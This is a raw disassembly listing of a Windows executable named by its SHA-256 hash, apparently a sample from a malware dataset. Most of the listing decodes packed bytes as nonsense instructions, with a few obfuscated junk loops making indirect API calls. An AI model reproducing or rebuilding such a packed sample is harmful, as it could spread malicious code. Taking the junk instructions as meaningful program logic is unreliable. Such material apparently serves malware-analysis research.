
fdb1302ce83edfbcfe94f4f35995eed2666d44d867cea52c27ea814e2ab10c7e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc98
  40100b:	jmp    0x4011ce
  401010:	inc    DWORD PTR ss:[esi]
  401013:	shl    BYTE PTR [edi-0x1ca60faf],1
  401019:	fs cmp eax,0xa57b728c
  40101f:	cmp    BYTE PTR [esi+0x7e],0x7e
  401023:	jle    0x400fbd
  401025:	jg     0x4010a5
  401027:	jle    0x400ff7
  401029:	xlat   BYTE PTR ds:[ebx]
  40102a:	cmp    eax,0xcfd339d5
  40102f:	ror    esi,1
  401031:	pop    es
  401032:	add    al,0x3
  401034:	packsswb mm0,QWORD PTR [eax]
  401037:	rdpmc  
  401039:	xadd   BYTE PTR [eax],bl
  40103c:	(bad)  
  40103d:	adc    BYTE PTR [edi],bl
  40103f:	mov    ecx,0xddb70058
  401044:	push   cs
  401045:	out    dx,eax
  401046:	mov    ebp,0x8e03d6db
  40104b:	es mov esi,0x1541a2f4
  401051:	lods   eax,DWORD PTR ds:[esi]
  401052:	fiadd  WORD PTR [esi+0x1f]
  401055:	data16 in al,dx
  401057:	outs   dx,DWORD PTR ds:[esi]
  401058:	or     edx,DWORD PTR [ecx]
  40105a:	pushf  
  40105b:	js     0x401033
  40105d:	inc    eax
  40105e:	stos   BYTE PTR es:[edi],al
  40105f:	push   ebx
  401060:	sub    eax,0xad3cc4d1
  401065:	mov    bh,BYTE PTR [ebx-0x3b]
  401068:	stos   DWORD PTR es:[edi],eax
  401069:	push   es
  40106a:	(bad)  
  40106b:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401071:	jmp    0x4010a3
  401073:	mov    ebp,ecx
  401075:	dec    edi
  401076:	out    0xa6,al
  401078:	inc    ecx
  401079:	call   DWORD PTR [edi-0x2556f868]
  40107f:	mov    ebp,0x5536ed4d
  401084:	and    esi,DWORD PTR [edx-0x43619116]
  40108a:	jnp    0x40109d
  40108c:	ret    
  40108d:	xchg   edx,eax
  40108e:	and    esp,edx
  401090:	jmp    0x4010f0
  401092:	ret    0xb8e4
  401095:	lock jmp 0xd765:0x74cf3192
  40109d:	and    ch,cl
  40109f:	add    bl,cl
  4010a1:	adc    DWORD PTR [ecx-0x5a],edx
  4010a4:	xor    eax,0x78616f03
  4010a9:	or     BYTE PTR [ecx],dh
  4010ab:	fisttp QWORD PTR [esi+0x7f752854]
  4010b1:	(bad)
  4010b6:	or     ebx,DWORD PTR [ebx+0x55]
  4010b9:	fst    st(6)
  4010bb:	or     ebx,edx
  4010bd:	pop    esp
  4010be:	fstp   DWORD PTR [ecx]
  4010c0:	jno    0x401060
  4010c2:	inc    esi
  4010c3:	dec    ebx
  4010c4:	aaa    
  4010c5:	adc    eax,0x1a29772b
  4010ca:	sar    DWORD PTR [esi],cl
  4010cc:	dec    edi
  4010cd:	call   0x2a0fb59f
  4010d2:	mov    al,ds:0xc2cecb0b
  4010d7:	das    
  4010d8:	fcom   QWORD PTR [ebx+0x3c7a7ccc]
  4010de:	pop    ss
  4010df:	jmp    0x569ba9e0
  4010e4:	adc    al,0x59
  4010e6:	es aam 0xca
  4010e9:	fimul  DWORD PTR [eax-0x7]
  4010ec:	das    
  4010ed:	push   ecx
  4010ee:	hlt    
  4010ef:	loope  0x4010a4
  4010f1:	mov    dl,0x39
  4010f3:	push   ebx
  4010f4:	xor    edi,DWORD PTR [ebp-0x1]
  4010f7:	ins    DWORD PTR es:[edi],dx
  4010f8:	xor    dh,BYTE PTR [edi]
  4010fa:	dec    eax
  4010fb:	std    
  4010fc:	call   0x420eb1c0
  401101:	scas   al,BYTE PTR es:[edi]
  401102:	test   ecx,0xb3d82f05
  401108:	jg     0x4010e3
  40110a:	add    BYTE PTR [esi],bh
  40110c:	xchg   edi,eax
  40110d:	mov    dl,0x82
  40110f:	mov    edi,0xada45fcd
  401114:	mov    cl,0x76
  401116:	stos   BYTE PTR es:[edi],al
  401117:	fstp   TBYTE PTR [eax+eax*2-0x43]
  40111b:	pop    ecx
  40111c:	add    al,0x8a
  40111e:	cmp    al,BYTE PTR [edi-0x570461e8]
  401124:	add    ecx,DWORD PTR [edx+0x3f]
  401127:	push   esp
  401128:	sbb    al,0xd
  40112a:	stos   DWORD PTR es:[edi],eax
  40112b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40112c:	and    DWORD PTR [ebx+0x8f0d549],edx
  401132:	mov    WORD PTR [ecx],es
  401134:	in     eax,dx
  401135:	sub    BYTE PTR [ebx-0x30],al
  401138:	jo     0x401102
  40113a:	dec    ebp
  40113b:	push   esi
  40113c:	fidivr DWORD PTR cs:[esi+eiz*2-0x15]
  401141:	mov    ebp,0x84fb6b11
  401146:	(bad)  
  401147:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401148:	or     eax,0xdb567437
  40114d:	out    dx,eax
  40114e:	in     al,dx
  40114f:	scas   al,BYTE PTR es:[edi]
  401150:	xor    edi,edx
  401152:	div    DWORD PTR [edi]
  401154:	and    ch,BYTE PTR [ebx]
  401156:	clc    
  401157:	mov    WORD PTR [ebp-0x77c01bba],?
  40115d:	jbe    0x401103
  40115f:	imul   edi,DWORD PTR [esi+0x42],0xffffffbf
  401163:	(bad)  
  401164:	je     0x401171
  401166:	dec    esp
  401167:	sbb    eax,0xbe98d72f
  40116c:	leave  
  40116d:	pop    ss
  40116e:	bound  ebp,QWORD PTR [edi-0x5d]
  401171:	pop    esi
  401172:	inc    esp
  401173:	lea    edx,[edx-0x79]
  401176:	dec    ebp
  401177:	or     DWORD PTR [ecx+ebp*2],esi
  40117a:	mov    al,ds:0xbcf95888
  40117f:	dec    esp
  401180:	cmp    ah,BYTE PTR [edx-0x5648f56e]
  401186:	es aaa 
  401188:	add    ebp,DWORD PTR [edx]
  40118a:	adc    dh,0x4b
  40118d:	xor    ebx,DWORD PTR [edx]
  40118f:	jns    0x401176
  401191:	mov    bh,0x70
  401193:	or     esi,DWORD PTR [esi-0x17404782]
  401199:	imul   ebp,esp,0x2265e3da
  40119f:	rcl    DWORD PTR [eax-0x77],1
  4011a2:	daa    
  4011a3:	aam    0x46
  4011a5:	add    eax,0x5d064cdf
  4011aa:	inc    ebp
  4011ab:	sub    esp,DWORD PTR [eax]
  4011ad:	icebp  
  4011ae:	out    dx,al
  4011af:	div    DWORD PTR [edx+0x5d]
  4011b2:	sub    esp,esi
  4011b4:	data16 test al,0xce
  4011b7:	jbe    0x4011e7
  4011b9:	mov    gs,WORD PTR [edi+0x42]
  4011bc:	adc    esp,esp
  4011be:	test   ebx,0x6bf8f14b
  4011c4:	cs push 0xffffffb1
  4011c7:	adc    ebp,esp
  4011c9:	(bad)  
  4011ca:	lods   eax,DWORD PTR ds:[esi]
  4011cb:	xor    DWORD PTR [ecx-0x1fba762f],edi
  4011d1:	mov    ecx,0x5d3a
  4011d6:	mov    ecx,DWORD PTR [ebp-0x20]
  4011d9:	mov    DWORD PTR [ebp-0x24],0x4ec1
  4011e0:	cmp    ecx,eax
  4011e2:	jne    0x4020c2
  4011e8:	sbb    ecx,0xfa8
  4011ee:	mov    ax,WORD PTR [ebp-0x24]
  4011f2:	and    DWORD PTR ds:0x430455,0x0
  4011fc:	mov    ecx,DWORD PTR ds:0x430455
  401202:	inc    ecx
  401203:	mov    DWORD PTR ds:0x430455,ecx
  401209:	cmp    DWORD PTR ds:0x430455,0xb
  401210:	jne    0x401248
  401216:	push   0x25a9
  40121b:	push   0x3372
  401220:	push   0x5bb7
  401225:	push   DWORD PTR [ebp-0x1c]
  401228:	push   0x6ec1
  40122d:	push   DWORD PTR [ebp-0x28]
  401230:	push   0x3d62
  401235:	push   0x5689
  40123a:	push   DWORD PTR [ebp-0x28]
  40123d:	push   0x7975
  401242:	call   DWORD PTR ds:0x42ec0b
  401248:	cmp    DWORD PTR ds:0x430455,0xa
  40124f:	jne    0x401262
  401255:	mov    ecx,DWORD PTR ds:0x430455
  40125b:	inc    ecx
  40125c:	mov    DWORD PTR ds:0x430455,ecx
  401262:	cmp    DWORD PTR ds:0x430455,0x12
  401269:	jb     0x4011fc
  40126f:	mov    DWORD PTR ds:0x43044d,0x1e
  401279:	cmp    DWORD PTR ds:0x43044d,0x0
  401280:	je     0x401471
  401286:	cmp    DWORD PTR ds:0x43044d,0x2d
  40128d:	jne    0x40129c
  401293:	push   DWORD PTR [ebp-0x20]
  401296:	call   DWORD PTR ds:0x42e9a7
  40129c:	mov    ecx,DWORD PTR ds:0x43044d
  4012a2:	dec    ecx
  4012a3:	mov    DWORD PTR ds:0x43044d,ecx
  4012a9:	jmp    0x401279
  4012ae:	jmp    0x401471
  4012b3:	out    0xe8,al
  4012b5:	sub    al,BYTE PTR [ebx]
  4012b7:	xor    cl,al
  4012b9:	imul   ecx
  4012bb:	and    BYTE PTR [ecx],bh
  4012bd:	adc    esi,DWORD PTR [ebx-0x761157ee]
  4012c3:	cwde   
  4012c4:	jg     0x401344
  4012c6:	jle    0x401260
  4012c8:	jg     0x401348
  4012ca:	jle    0x40131d
  4012cc:	aaa    
  4012cd:	jge    0x40129d
  4012cf:	xchg   BYTE PTR [ebx-0x7666abfc],dh
  4012d5:	push   edx
  4012d6:	xor    ah,cl
  4012d8:	and    al,0xe5
  4012da:	xor    ebx,ecx
  4012dc:	scas   al,BYTE PTR es:[edi]
  4012dd:	imul   ebx,DWORD PTR [esi+0x46],0xe1fcc1a5
  4012e4:	ret    
  4012e5:	pop    edx
  4012e6:	imul   ebp,DWORD PTR [ebp-0x6e],0x201270c
  4012ed:	sbb    DWORD PTR [eax],0x9cf5a26b
  4012f3:	sbb    eax,0xaa833c55
  4012f8:	iret   
  4012f9:	dec    edi
  4012fa:	sbb    BYTE PTR [esi],cl
  4012fc:	mul    BYTE PTR [ebx]
  4012fe:	xor    esi,DWORD PTR [esi-0x53]
  401301:	xchg   esi,eax
  401302:	push   edi
  401303:	(bad)  
  401304:	sub    al,0xc5
  401306:	jnp    0x4012b6
  401308:	pop    edx
  401309:	mov    ecx,0x7d545c9
  40130e:	shl    dh,cl
  401310:	inc    esp
  401311:	push   ss
  401312:	or     al,0x97
  401314:	xchg   edx,esp
  401316:	setbe  BYTE PTR [ecx]
  401319:	fcmovnbe st,st(2)
  40131b:	jnp    0x4012d2
  40131d:	(bad)  
  40131e:	mov    esi,0x27f97379
  401323:	xor    al,0x98
  401325:	xor    BYTE PTR [ecx+0x2e2dd3d9],dl
  40132b:	lahf   
  40132c:	pop    eax
  40132d:	mov    edx,0xd5cefc86
  401332:	mov    dl,0x62
  401334:	add    eax,0x14aec059
  401339:	xor    BYTE PTR [eax],0x3
  40133c:	es mov eax,0xdc01afcb
  401343:	mov    eax,0x756f20f3
  401348:	nop
  401349:	addr16 xor al,0xfa
  40134c:	cmp    DWORD PTR [ebx],0x5804ced2
  401352:	and    edi,ecx
  401354:	mov    ss,esp
  401356:	jmp    0x338b1bbf
  40135b:	mov    eax,0x76e3dd8a
  401360:	lds    edx,FWORD PTR [ebx]
  401362:	cmp    DWORD PTR [edx+0x3],edx
  401365:	inc    esi
  401366:	clc    
  401367:	stos   DWORD PTR es:[edi],eax
  401368:	mov    ch,bh
  40136a:	mov    ds:0x9ee9faea,al
  40136f:	lea    esi,[ebp-0x46a7e4e8]
  401375:	fiadd  DWORD PTR [ebx+ebp*1+0x4580969b]
  40137c:	lahf   
  40137d:	xchg   ebx,eax
  40137e:	cwde   
  40137f:	popa   
  401380:	sbb    eax,0x4b835e75
  401385:	mov    esp,ss
  401387:	call   0xc28c4f5e
  40138c:	call   DWORD PTR [edi+0x78679279]
  401392:	cwde   
  401393:	test   BYTE PTR [ebp+0xe],ch
  401396:	mov    dh,0x56
  401398:	addr16 adc eax,0xfca77caf
  40139e:	out    0xde,eax
  4013a0:	push   es
  4013a1:	adc    BYTE PTR [ecx],al
  4013a3:	rcr    BYTE PTR ds:0xcf8c42c0,cl
  4013a9:	add    BYTE PTR [eax+0x67],bh
  4013ac:	xchg   ecx,eax
  4013ad:	push   ebp
  4013ae:	or     eax,0x8c4f5230
  4013b3:	mov    al,ds:0x51c4a27d
  4013b8:	push   0x70
  4013ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013bb:	dec    ebp
  4013bc:	pop    ecx
  4013bd:	and    BYTE PTR [eax],dh
  4013bf:	stos   DWORD PTR es:[edi],eax
  4013c0:	stc    
  4013c1:	adc    eax,0x94f92062
  4013c6:	(bad)  
  4013c7:	les    esp,FWORD PTR [ebx-0xa]
  4013ca:	mov    ah,0x43
  4013cc:	aam    0x9d
  4013ce:	pop    es
  4013cf:	test   dl,al
  4013d1:	mov    bh,0x24
  4013d3:	jo     0x40136d
  4013d5:	int    0xba
  4013d7:	or     BYTE PTR [esi-0x793ac233],bh
  4013dd:	jb     0x4013b1
  4013df:	mov    ch,0xd7
  4013e1:	sar    BYTE PTR [esi+0x6a],1
  4013e4:	js     0x4013b4
  4013e6:	add    BYTE PTR [edx+0x23d38d8b],dl
  4013ec:	rol    ch,1
  4013ee:	mov    WORD PTR [edx+ebx*4-0x8],ss
  4013f2:	out    dx,al
  4013f3:	jae    0x401455
  4013f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013f6:	daa    
  4013f7:	arpl   WORD PTR [ebx],si
  4013f9:	push   0x1c
  4013fb:	adc    al,0x87
  4013fd:	and    DWORD PTR [ebp-0x69d70fb3],esp
  401403:	(bad)  
  401405:	in     eax,0xa9
  401407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401408:	rcl    BYTE PTR [eax],1
  40140a:	(bad)  
  40140b:	call   0xaa42:0x59b91fe0
  401412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401413:	dec    eax
  401414:	cmp    esi,DWORD PTR [edx+0x132f94b9]
  40141a:	fcomp  QWORD PTR [ebx]
  40141d:	adc    edx,ebx
  40141f:	icebp  
  401420:	or     ebp,esi
  401422:	imul   ebx,DWORD PTR ds:0x2764e99c,0x15
  401429:	sbb    ebx,DWORD PTR [ebx+0x2dc66f32]
  40142f:	popa   
  401430:	mov    al,0x1f
  401432:	dec    edx
  401433:	push   edx
  401434:	inc    ebx
  401435:	rol    ebp,0xc3
  401438:	jl     0x4013d5
  40143a:	mov    ah,0x96
  40143c:	inc    DWORD PTR [ecx-0x7726a77b]
  401442:	imul   ebx,DWORD PTR ds:0x198a31e0,0xffffff92
  401449:	mov    ebp,0x153a3d7c
  40144e:	aaa    
  40144f:	js     0x401452
  401451:	lock add BYTE PTR [ebx+0x47],al
  401455:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401456:	and    DWORD PTR [edi+eax*4-0x60a573de],ebx
  40145d:	mov    ah,0xf8
  40145f:	enter  0x4e48,0xf2
  401463:	add    ebx,esi
  401465:	in     eax,dx
  401466:	cmp    BYTE PTR [ebp+0x5723ef38],0x1a
  40146d:	adc    bl,BYTE PTR [ebx-0x46a9df0a]
  401473:	cmp    al,0x8a
  401475:	add    BYTE PTR [eax],al
  401477:	adc    DWORD PTR ds:0x42eddb,0x2f3d
  401481:	xor    ax,cx
  401484:	movzx  esi,WORD PTR ds:0x430439
  40148b:	or     DWORD PTR ds:0x4304eb,esi
  401491:	mov    ecx,DWORD PTR [ebp+0x8]
  401494:	jmp    0x401657
  401499:	adc    eax,0x716ff192
  40149e:	ins    DWORD PTR es:[edi],dx
  40149f:	xchg   ecx,eax
  4014a0:	jo     0x40144d
  4014a2:	or     eax,0xe4e0fff
  4014a7:	jb     0x401477
  4014a9:	ret    0x7e7d
  4014ac:	jle    0x401446
  4014ae:	jg     0x40152e
  4014b0:	jle    0x401434
  4014b2:	pop    esp
  4014b3:	sub    bh,BYTE PTR [edi-0x3adc587d]
  4014b9:	mov    al,0x27
  4014bb:	and    ebx,esi
  4014bd:	sbb    dh,ah
  4014bf:	inc    edi
  4014c0:	fild   DWORD PTR [ebp+0x4]
  4014c3:	enter  0x3d52,0xd1
  4014c7:	imul   BYTE PTR [esi+0x6b754da6]
  4014cd:	push   edx
  4014ce:	xchg   esp,eax
  4014cf:	cld    
  4014d0:	sbb    al,0xdb
  4014d2:	or     DWORD PTR [edx+0x7715ea6b],eax
  4014d8:	inc    edx
  4014d9:	sbb    BYTE PTR [ebp+0x7],bh
  4014dc:	fcmovne st,st(0)
  4014de:	out    dx,al
  4014df:	adc    BYTE PTR [ebp-0x72a094d0],bl
  4014e5:	jbe    0x40152f
  4014e7:	xor    ah,BYTE PTR [esi]
  4014e9:	jmp    0x3aa:0xe4f49773
  4014f0:	inc    ebp
  4014f1:	fdivp  st(2),st
  4014f3:	xor    BYTE PTR [ecx+ebp*2+0x74],0x9b
  4014f8:	adc    al,0xc0
  4014fa:	(bad)  
  4014fb:	mov    WORD PTR [ebp-0x59],es
  4014fe:	xchg   BYTE PTR fs:[edi],ch
  401501:	inc    edi
  401502:	adc    dh,dh
  401504:	sbb    dh,BYTE PTR [edx*8+0x4fe48fbc]
  40150b:	rcr    DWORD PTR cs:[edx-0x74],1
  40150f:	jg     0x4014cc
  401511:	or     edi,DWORD PTR [esp+ebp*1+0x47]
  401515:	xchg   DWORD PTR gs:[edi+0x4ece453],esp
  40151c:	mov    ds:0xa404244e,eax
  401521:	scas   al,BYTE PTR es:[edi]
  401522:	js     0x401549
  401524:	sub    al,0xaf
  401526:	bound  edx,QWORD PTR [ebx+esi*2]
  401529:	or     dh,0xcc
  40152c:	lea    ebp,[edi]
  40152e:	outs   dx,DWORD PTR ds:[esi]
  40152f:	(bad)  
  401530:	xor    al,0x8a
  401532:	xchg   esp,eax
  401533:	in     eax,dx
  401534:	ja     0x4014e5
  401536:	pop    ecx
  401537:	sti    
  401538:	ds jne 0x40159f
  40153b:	mov    cl,0x50
  40153d:	sub    al,0xf7
  40153f:	fs out dx,al
  401541:	pop    ss
  401542:	and    BYTE PTR [eax-0x51cd61e8],al
  401548:	or     eax,0x22ee4e27
  40154d:	mov    ebx,0x6b556c63
  401552:	cli    
  401553:	aad    0x1b
  401555:	lahf   
  401556:	xor    eax,0x5c539099
  40155b:	dec    ebp
  40155c:	and    BYTE PTR ss:[eax+0x62],dh
  401560:	pop    esi
  401561:	mov    edx,0x19286c97
  401566:	icebp  
  401567:	rol    DWORD PTR [edx],cl
  401569:	popf   
  40156a:	xlat   BYTE PTR ds:[ebx]
  40156b:	fstp   TBYTE PTR [edx-0x75]
  40156e:	test   eax,0x1ffb911e
  401573:	adc    DWORD PTR [edi+edx*8],esi
  401576:	mov    esp,0xefa2fd4
  40157b:	jne    0x401565
  40157d:	arpl   WORD PTR [esi],bp
  40157f:	ret    0x18b0
  401582:	aas    
  401583:	mov    esi,gs
  401585:	shr    DWORD PTR [esi+0x792d232a],1
  40158b:	push   eax
  40158c:	addr16 jo 0x4015c6
  40158f:	sub    ecx,edi
  401591:	mov    ebx,0xc16efa31
  401596:	push   ss
  401597:	add    ebx,0x4abbd47c
  40159d:	sbb    DWORD PTR [ecx],0xffffff91
  4015a0:	mov    bh,0x95
  4015a2:	push   cs
  4015a3:	push   cs
  4015a4:	mov    ch,0xae
  4015a7:	outs   dx,BYTE PTR ds:[esi]
  4015a8:	adc    edx,ebp
  4015aa:	aas    
  4015ab:	(bad)  
  4015ad:	popa   
  4015ae:	sub    DWORD PTR [ecx+0xf5b62e1],ebp
  4015b4:	pop    ds
  4015b5:	stc    
  4015b6:	or     edi,DWORD PTR [ebx-0x2]
  4015b9:	hlt    
  4015ba:	mov    ecx,DWORD PTR [esi]
  4015bc:	and    ebp,DWORD PTR [edx+ebp*1+0x5911ebd5]
  4015c3:	pop    eax
  4015c4:	adc    bl,BYTE PTR [ebp+ebp*2-0x2edd63ae]
  4015cb:	xor    DWORD PTR [eax-0x4384464f],edx
  4015d1:	js     0x4015fa
  4015d3:	lock mov edi,DWORD PTR [esi]
  4015d6:	sub    esp,DWORD PTR [eax]
  4015d8:	repnz pop eax
  4015da:	(bad)  
  4015db:	push   ds
  4015dc:	or     BYTE PTR [ecx+0x11701946],bh
  4015e2:	jmp    0x401566
  4015e4:	cmp    BYTE PTR [edi+0x4c],ch
  4015e7:	or     BYTE PTR [esi-0x311b4339],ch
  4015ed:	mov    BYTE PTR [edx],cl
  4015ef:	les    ebp,FWORD PTR [edx-0x26a45a2a]
  4015f5:	sub    eax,edi
  4015f7:	loope  0x40161e
  4015f9:	ja     0x58a1fc29
  4015ff:	push   ds
  401600:	sub    eax,0xa039ea66
  401605:	loope  0x401639
  401607:	ficomp DWORD PTR [ebx]
  401609:	mov    bl,0xf0
  40160b:	and    esp,ebp
  40160d:	div    dl
  40160f:	jp     0x40166d
  401611:	sbb    ecx,DWORD PTR ds:0xf1fb9178
  401617:	jbe    0x4015b8
  401619:	dec    esp
  40161a:	addr16 pop ebx
  40161c:	inc    eax
  40161d:	adc    al,0xf9
  40161f:	mov    esi,0x247f5a77
  401624:	js     0x401631
  401626:	lahf   
  401627:	jns    0x401615
  401629:	mov    ecx,DWORD PTR [ecx]
  40162b:	fstp   DWORD PTR [esp+ebx*1]
  40162e:	sub    esp,DWORD PTR [ecx-0x2ef0b506]
  401634:	fld    QWORD PTR [ecx]
  401636:	aas    
  401637:	mov    ds:0xab76a04c,al
  40163c:	xchg   esi,eax
  40163d:	clc    
  40163e:	dec    edx
  40163f:	sub    BYTE PTR [bp+si-0x1251],cl
  401644:	adc    eax,0xeac7b521
  401649:	imul   BYTE PTR [esi]
  40164b:	or     eax,0xd61f0835
  401650:	aas    
  401651:	jo     0x4015e6
  401653:	out    dx,al
  401654:	or     DWORD PTR ds:0xf7235799,edx
  40165a:	jmp    0x40181d
  40165f:	push   cs
  401660:	and    BYTE PTR [edi],dh
  401662:	pop    ebp
  401663:	xor    DWORD PTR [ecx+0x54],ebp
  401666:	jno    0x4016b3
  401668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401669:	cmp    BYTE PTR [edi],bl
  40166b:	loopne 0x4015ff
  40166d:	dec    edx
  40166e:	fs ins BYTE PTR es:[edi],dx
  401670:	jp     0x4016f0
  401672:	jle    0x40160c
  401674:	jg     0x4016f4
  401676:	jle    0x4016a0
  401678:	mov    ds:0x5368c32,eax
  40167d:	adc    al,0x74
  40167f:	dec    eax
  401680:	dec    esi
  401681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401682:	cld    
  401683:	out    dx,eax
  401684:	and    DWORD PTR [ecx],ebx
  401686:	jmp    0x401643
  401688:	xchg   edx,eax
  401689:	sbb    eax,DWORD PTR [esp+ebp*2]
  40168c:	stc    
  40168d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40168e:	push   ebp
  40168f:	das    
  401690:	je     0x401627
  401692:	pop    DWORD PTR ds:0x1ec7331
  401698:	mov    ds:0xee96aa7e,eax
  40169d:	pop    es
  40169e:	cmp    edi,DWORD PTR ds:0x9ad821ec
  4016a4:	iret   
  4016a5:	stos   BYTE PTR es:[edi],al
  4016a6:	xor    DWORD PTR [edi+0x2c],esp
  4016a9:	add    eax,eax
  4016ab:	xor    bh,BYTE PTR [ebx+edi*4-0x2a8e89d9]
  4016b2:	push   es
  4016b3:	dec    ecx
  4016b4:	shl    BYTE PTR [eax-0xfa72c89],1
  4016ba:	sbb    BYTE PTR ds:0xb874d012,ah
  4016c0:	ret    
  4016c1:	lahf   
  4016c2:	scas   al,BYTE PTR es:[edi]
  4016c3:	mov    esp,0x7bfe3413
  4016c8:	je     0x40166e
  4016ca:	gs sub al,0xe4
  4016cd:	jbe    0x401719
  4016cf:	stos   BYTE PTR es:[edi],al
  4016d0:	mov    esi,0xa2d04c7
  4016d5:	pop    ss
  4016d6:	(bad)  
  4016d7:	loop   0x4016af
  4016d9:	mov    esp,0x199fcda4
  4016de:	cmp    eax,0x70770775
  4016e3:	mov    dh,0xb3
  4016e5:	pop    ecx
  4016e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016e7:	jae    0x40169b
  4016e9:	push   ebp
  4016ea:	or     BYTE PTR [ecx-0x63],ch
  4016ed:	xor    DWORD PTR [edi+0x50],esp
  4016f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016f1:	int    0x44
  4016f3:	loope  0x401698
  4016f5:	call   0xcef5:0x342371d5
  4016fc:	jmp    0x401768
  4016fe:	or     al,0xe2
  401700:	adc    eax,DWORD PTR [edx]
  401702:	stos   BYTE PTR es:[edi],al
  401703:	aas    
  401704:	push   eax
  401705:	dec    ebx
  401706:	sub    esp,DWORD PTR [edi-0x47cb8967]
  40170c:	icebp  
  40170d:	or     edx,DWORD PTR [esp+ebx*1+0x31]
  401711:	loop   0x40177c
  401713:	ret    0x73a7
  401716:	test   al,0xda
  401718:	dec    BYTE PTR [edi+0x5b5054db]
  40171e:	dec    ebp
  40171f:	test   DWORD PTR [edi+0x15],esi
  401722:	add    DWORD PTR ds:0x6608f3a0,0x78
  401729:	mov    eax,ds:0x37fd8b9d
  40172e:	fsubr  st,st(5)
  401730:	loope  0x4016f6
  401732:	jae    0x4016c8
  401734:	jecxz  0x40178d
  401736:	cmp    al,0xa0
  401738:	sub    eax,DWORD PTR [esi]
  40173a:	sbb    eax,0xe08a97b7
  40173f:	add    DWORD PTR [eax],esp
  401741:	push   cs
  401742:	pusha  
  401743:	xchg   edi,eax
  401744:	imul   ecx,eax,0xffffffa0
  401747:	jbe    0x4016f9
  401749:	push   cs
  40174a:	lods   eax,DWORD PTR ds:[esi]
  40174b:	cmp    BYTE PTR [edi],0x4a
  40174e:	inc    edx
  40174f:	and    BYTE PTR [esi+0x4b],dh
  401752:	ins    BYTE PTR es:[edi],dx
  401753:	test   DWORD PTR [esi+0x54],edi
  401756:	or     DWORD PTR [ebx],esp
  401758:	pushfw 
  40175a:	test   ecx,0xe89c392
  401760:	lea    esi,[edi+0x537ec920]
  401766:	push   edx
  401767:	popa   
  401768:	xchg   ebx,eax
  401769:	dec    ebp
  40176a:	add    ch,cl
  40176c:	add    ebx,DWORD PTR [edx-0x4]
  40176f:	cmc    
  401770:	mov    al,ds:0x4652979
  401775:	fldcw  WORD PTR [ecx]
  401777:	push   0xffffffa0
  401779:	inc    edi
  40177a:	xor    eax,0x1ce61fd8
  40177f:	in     al,dx
  401780:	xchg   edi,eax
  401781:	mov    gs,eax
  401783:	add    BYTE PTR [ecx-0x260ca920],dh
  401789:	imul   esp,edi,0x38
  40178c:	and    BYTE PTR [edx+0x615ac2a5],al
  401792:	mov    ?,WORD PTR [esi+ecx*1]
  401795:	fwait
  401796:	lock call DWORD PTR [ebx+0x2083f099]
  40179d:	pop    edx
  40179e:	jge    0x401769
  4017a0:	fwait
  4017a1:	xchg   esp,eax
  4017a2:	xor    BYTE PTR [ecx],al
  4017a4:	sub    BYTE PTR [edi-0x4b698381],ah
  4017aa:	repz (bad)
  4017ad:	add    eax,0x7c85aac8
  4017b2:	cmp    eax,0x7fee49b6
  4017b7:	test   DWORD PTR [esi],esp
  4017b9:	xor    dh,dl
  4017bb:	push   DWORD PTR [ebx+0x7e]
  4017be:	sbb    BYTE PTR [ebx+0x1c],al
  4017c1:	das    
  4017c2:	imul   ebp,DWORD PTR [ecx+0x27],0x27da4a6f
  4017c9:	loope  0x40181c
  4017cb:	pop    ebp
  4017cc:	ficomp DWORD PTR [ecx-0x4959872]
  4017d2:	mov    es,ebp
  4017d4:	inc    ecx
  4017d5:	push   cs
  4017d6:	in     eax,dx
  4017d7:	jo     0x40175f
  4017d9:	imul   dh
  4017db:	outs   dx,BYTE PTR ds:[esi]
  4017dc:	pop    ss
  4017dd:	pusha  
  4017de:	adc    al,0x25
  4017e0:	push   ebp
  4017e1:	ret    
  4017e2:	pop    esi
  4017e3:	xchg   ebx,eax
  4017e4:	cdq    
  4017e5:	pusha  
  4017e6:	scas   al,BYTE PTR es:[edi]
  4017e7:	xchg   edx,eax
  4017e8:	pop    ecx
  4017e9:	cmp    BYTE PTR [edx],dl
  4017eb:	push   0xbad96751
  4017f0:	aad    0x89
  4017f2:	ja     0x401776
  4017f4:	sbb    cl,bh
  4017f6:	inc    edx
  4017f7:	in     eax,dx
  4017f8:	sahf   
  4017f9:	push   ds
  4017fa:	jmp    0x401827
  4017fc:	mov    BYTE PTR [ebp-0x4d011d2b],cl
  401802:	push   edi
  401803:	inc    esi
  401804:	ins    BYTE PTR es:[edi],dx
  401805:	jo     0x4017f8
  401807:	mov    edi,0xb0c1f252
  40180c:	jne    0x40185f
  40180e:	jae    0x4017a8
  401810:	jne    0x401856
  401812:	sub    eax,0xf49d51b1
  401817:	jg     0x40182d
  401819:	cmp    ah,BYTE PTR [ebx]
  40181b:	mov    ah,0x89
  40181d:	mov    edi,0x3b02
  401822:	add    ax,di
  401825:	mov    DWORD PTR ds:0x430455,0x60d8
  40182f:	movzx  eax,ax
  401832:	and    DWORD PTR ds:0x430459,0x0
  40183c:	mov    esi,DWORD PTR ds:0x430459
  401842:	inc    esi
  401843:	mov    DWORD PTR ds:0x430459,esi
  401849:	cmp    DWORD PTR ds:0x430459,0x1d
  401850:	jne    0x401863
  401856:	push   0x0
  401858:	push   0x21fd
  40185d:	call   DWORD PTR ds:0x42ea93
  401863:	cmp    DWORD PTR ds:0x430459,0x10
  40186a:	jb     0x40183c
  401870:	sbb    esi,0x67dd
  401876:	not    eax
  401878:	and    eax,DWORD PTR [ecx]
  40187a:	and    DWORD PTR ds:0x4304e3,0x0
  401884:	jmp    0x401898
  401889:	xor    esi,esi
  40188b:	xor    esi,DWORD PTR ds:0x4304e3
  401891:	inc    esi
